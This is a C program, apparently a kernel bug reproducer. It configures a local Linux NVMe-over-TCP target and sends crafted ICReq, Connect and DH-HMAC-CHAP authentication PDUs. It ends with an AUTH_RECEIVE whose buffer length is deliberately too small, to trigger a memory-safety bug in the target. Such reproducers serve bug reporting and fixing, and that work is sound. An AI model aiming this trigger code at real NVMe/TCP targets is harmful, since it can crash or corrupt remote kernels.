// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdint.h>

#define CFS "/sys/kernel/config"
#define NQN "testnqn"

struct tcp_hdr {
	uint8_t  type;
	uint8_t  flags;
	uint8_t  hlen;
	uint8_t  pdo;
	uint32_t plen;
} __attribute__((packed));

struct icreq_pdu {
	struct tcp_hdr hdr;
	uint16_t pfv;
	uint8_t  hpda;
	uint8_t  digest;
	uint32_t maxr2t;
	uint8_t  rsvd2[112];
} __attribute__((packed));

struct sgl_desc {
	uint64_t addr;
	uint32_t length;
	uint8_t  rsvd[3];
	uint8_t  type;
} __attribute__((packed));

struct nvme_cmd {
	uint8_t  opcode;
	uint8_t  flags;
	uint16_t command_id;
	uint8_t  fctype;
	uint8_t  resv2[19];
	struct sgl_desc sgl;
	uint8_t  spec[24];
} __attribute__((packed));

struct cmd_pdu {
	struct tcp_hdr  hdr;
	struct nvme_cmd cmd;
} __attribute__((packed));

#define NVME_TCP_ICREQ	0x00
#define NVME_TCP_ICRESP	0x01
#define NVME_TCP_CMD	0x04
#define NVME_TCP_RSP	0x05
#define NVME_TCP_C2H	0x07

#define NVME_FABRICS_OPC	0x7f
#define FCTYPE_CONNECT		0x01
#define FCTYPE_AUTH_SEND	0x05
#define FCTYPE_AUTH_RECV	0x06

#define SGL_INLINE	((0x00 << 4) | 0x01)
#define SGL_HOSTDATA	((0x05 << 4) | 0x0a)
#define CMD_SGL_METABUF	(1 << 6)

#define AUTH_SECP	0xe9
#define AUTH_COMMON_MSG	0x00
#define AUTH_DHCHAP_MSG	0x01
#define MSG_NEGOTIATE	0x00
#define DHCHAP_AUTH_ID	0x01
#define HASH_SHA256	0x01
#define DHGROUP_2048	0x01

static int wr(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int r;

	if (fd < 0) {
		printf("[-] open(%s): %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, val, strlen(val));
	if (r < 0)
		printf("[-] write(%s, %s): %s\n", path, val, strerror(errno));
	close(fd);
	return r < 0 ? -1 : 0;
}

static int setup_target(void)
{
	char p[512];

	mkdir(CFS, 0755);
	if (mount("none", CFS, "configfs", 0, NULL) && errno != EBUSY) {
		printf("[-] mount configfs: %s\n", strerror(errno));
		return -1;
	}

	snprintf(p, sizeof(p), CFS "/nvmet/subsystems/" NQN);
	if (mkdir(p, 0755) && errno != EEXIST) {
		printf("[-] mkdir subsys: %s\n", strerror(errno));
		return -1;
	}
	if (wr(CFS "/nvmet/subsystems/" NQN "/attr_allow_any_host", "1"))
		return -1;

	if (mkdir(CFS "/nvmet/ports/1", 0755) && errno != EEXIST) {
		printf("[-] mkdir port: %s\n", strerror(errno));
		return -1;
	}
	wr(CFS "/nvmet/ports/1/addr_adrfam", "ipv4");
	wr(CFS "/nvmet/ports/1/addr_traddr", "127.0.0.1");
	wr(CFS "/nvmet/ports/1/addr_trsvcid", "4420");
	if (wr(CFS "/nvmet/ports/1/addr_trtype", "tcp"))
		return -1;

	if (symlink(CFS "/nvmet/subsystems/" NQN,
		    CFS "/nvmet/ports/1/subsystems/" NQN) && errno != EEXIST) {
		printf("[-] symlink: %s\n", strerror(errno));
		return -1;
	}
	printf("[+] nvmet tcp target up on 127.0.0.1:4420\n");
	return 0;
}

static int xsend(int fd, const void *buf, size_t len)
{
	const char *p = buf;
	while (len) {
		ssize_t n = send(fd, p, len, 0);
		if (n <= 0)
			return -1;
		p += n;
		len -= n;
	}
	return 0;
}

static int xrecv(int fd, void *buf, size_t len)
{
	char *p = buf;
	while (len) {
		ssize_t n = recv(fd, p, len, 0);
		if (n <= 0)
			return -1;
		p += n;
		len -= n;
	}
	return 0;
}

static int read_pdu(int fd)
{
	struct tcp_hdr hdr;
	unsigned char buf[4096];
	uint32_t plen, rest;

	if (xrecv(fd, &hdr, sizeof(hdr)))
		return -1;
	plen = hdr.plen;
	if (hdr.hlen > sizeof(hdr)) {
		if (xrecv(fd, buf, hdr.hlen - sizeof(hdr)))
			return -1;
	}
	rest = plen > hdr.hlen ? plen - hdr.hlen : 0;
	while (rest) {
		uint32_t chunk = rest > sizeof(buf) ? sizeof(buf) : rest;
		if (xrecv(fd, buf, chunk))
			return -1;
		rest -= chunk;
	}
	printf("[*] rx pdu type=0x%02x flags=0x%02x hlen=%u plen=%u\n",
	       hdr.type, hdr.flags, hdr.hlen, plen);
	return hdr.type;
}

static int wait_rsp(int fd)
{
	for (;;) {
		int t = read_pdu(fd);
		if (t < 0)
			return -1;
		if (t == NVME_TCP_RSP)
			return 0;
	}
}

static int connect_target(void)
{
	struct sockaddr_in sa;
	struct timeval tv = { .tv_sec = 5 };
	int fd, one = 1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return -1;
	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(4420);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa))) {
		printf("[-] connect: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	return fd;
}

static int do_icreq(int fd)
{
	struct icreq_pdu req;
	unsigned char resp[128];

	memset(&req, 0, sizeof(req));
	req.hdr.type = NVME_TCP_ICREQ;
	req.hdr.hlen = sizeof(req);
	req.hdr.pdo  = 0;
	req.hdr.plen = sizeof(req);
	req.pfv      = 0;
	req.hpda     = 0;
	req.digest   = 0;
	req.maxr2t   = 0;

	if (xsend(fd, &req, sizeof(req)))
		return -1;
	if (xrecv(fd, resp, sizeof(resp)))
		return -1;
	if (resp[0] != NVME_TCP_ICRESP) {
		printf("[-] bad icresp type 0x%02x\n", resp[0]);
		return -1;
	}
	printf("[+] icresp ok (digest=0x%02x cpda=%u)\n", resp[11], resp[10]);
	return 0;
}

static int send_capsule(int fd, struct nvme_cmd *cmd,
			const void *data, uint32_t dlen)
{
	struct cmd_pdu pdu;

	memset(&pdu, 0, sizeof(pdu));
	pdu.hdr.type = NVME_TCP_CMD;
	pdu.hdr.flags = 0;
	pdu.hdr.hlen = sizeof(pdu);
	pdu.hdr.pdo  = dlen ? sizeof(pdu) : 0;
	pdu.hdr.plen = sizeof(pdu) + dlen;
	pdu.cmd = *cmd;

	if (xsend(fd, &pdu, sizeof(pdu)))
		return -1;
	if (dlen && xsend(fd, data, dlen))
		return -1;
	return 0;
}

static int do_connect_cmd(int fd)
{
	struct nvme_cmd c;
	unsigned char d[1024];

	memset(&c, 0, sizeof(c));
	c.opcode     = NVME_FABRICS_OPC;
	c.flags      = CMD_SGL_METABUF;
	c.command_id = 0x0001;
	c.fctype     = FCTYPE_CONNECT;
	c.sgl.addr   = 0;
	c.sgl.length = sizeof(d);
	c.sgl.type   = SGL_INLINE;

	*(uint16_t *)&c.spec[0] = 0;
	*(uint16_t *)&c.spec[2] = 0;
	*(uint16_t *)&c.spec[4] = 31;
	c.spec[6] = 0;
	*(uint32_t *)&c.spec[8] = 0;

	memset(d, 0, sizeof(d));
	memset(d, 0x11, 16);
	*(uint16_t *)(d + 16) = 0xffff;
	snprintf((char *)d + 256, 256, "%s", NQN);
	snprintf((char *)d + 512, 256,
		 "nqn.2014-08.org.nvmexpress:uuid:11111111-1111-1111-1111-111111111111");

	if (send_capsule(fd, &c, d, sizeof(d)))
		return -1;
	return wait_rsp(fd);
}

static int do_auth_negotiate(int fd, uint16_t tid)
{
	struct nvme_cmd c;
	unsigned char d[8 + 64];

	memset(d, 0, sizeof(d));
	d[0] = AUTH_COMMON_MSG;
	d[1] = MSG_NEGOTIATE;
	*(uint16_t *)(d + 4) = tid;
	d[6] = 0;
	d[7] = 1;

	d[8]  = DHCHAP_AUTH_ID;
	d[9]  = 0;
	d[10] = 1;
	d[11] = 1;
	d[12 + 0]  = HASH_SHA256;
	d[12 + 30] = DHGROUP_2048;

	memset(&c, 0, sizeof(c));
	c.opcode     = NVME_FABRICS_OPC;
	c.flags      = CMD_SGL_METABUF;
	c.command_id = 0x0002;
	c.fctype     = FCTYPE_AUTH_SEND;
	c.sgl.addr   = 0;
	c.sgl.length = sizeof(d);
	c.sgl.type   = SGL_INLINE;

	c.spec[1] = 0x01;
	c.spec[2] = 0x01;
	c.spec[3] = AUTH_SECP;
	*(uint32_t *)&c.spec[4] = sizeof(d);

	if (send_capsule(fd, &c, d, sizeof(d)))
		return -1;
	return wait_rsp(fd);
}

static int do_auth_receive(int fd, uint32_t al)
{
	struct nvme_cmd c;

	memset(&c, 0, sizeof(c));
	c.opcode     = NVME_FABRICS_OPC;
	c.flags      = CMD_SGL_METABUF;
	c.command_id = 0x0003;
	c.fctype     = FCTYPE_AUTH_RECV;
	c.sgl.addr   = 0;
	c.sgl.length = al;
	c.sgl.type   = SGL_HOSTDATA;

	c.spec[1] = 0x01;
	c.spec[2] = 0x01;
	c.spec[3] = AUTH_SECP;
	*(uint32_t *)&c.spec[4] = al;

	if (send_capsule(fd, &c, NULL, 0))
		return -1;
	return wait_rsp(fd);
}

static int one_round(uint32_t al, uint16_t tid)
{
	int fd = connect_target();

	if (fd < 0)
		return -1;
	if (do_icreq(fd))
		goto out;
	printf("[+] icreq/icresp done\n");
	if (do_connect_cmd(fd)) {
		printf("[-] connect failed\n");
		goto out;
	}
	printf("[+] fabrics connect done\n");
	if (do_auth_negotiate(fd, tid)) {
		printf("[-] auth negotiate failed\n");
		goto out;
	}
	printf("[+] auth negotiate done, step should be CHALLENGE\n");
	printf("[*] sending AUTH_RECEIVE with al = %u (guard wants %u, real need 16+hl)\n",
	       al, al);
	do_auth_receive(fd, al);
out:
	close(fd);
	return 0;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);

	if (setup_target())
		return 1;

	one_round(1 + 32, 0x1234);

	one_round(1 + 32, 0x1235);
	one_round(1 + 32, 0x1236);

	printf("[*] done\n");
	sleep(2);
	return 0;
}
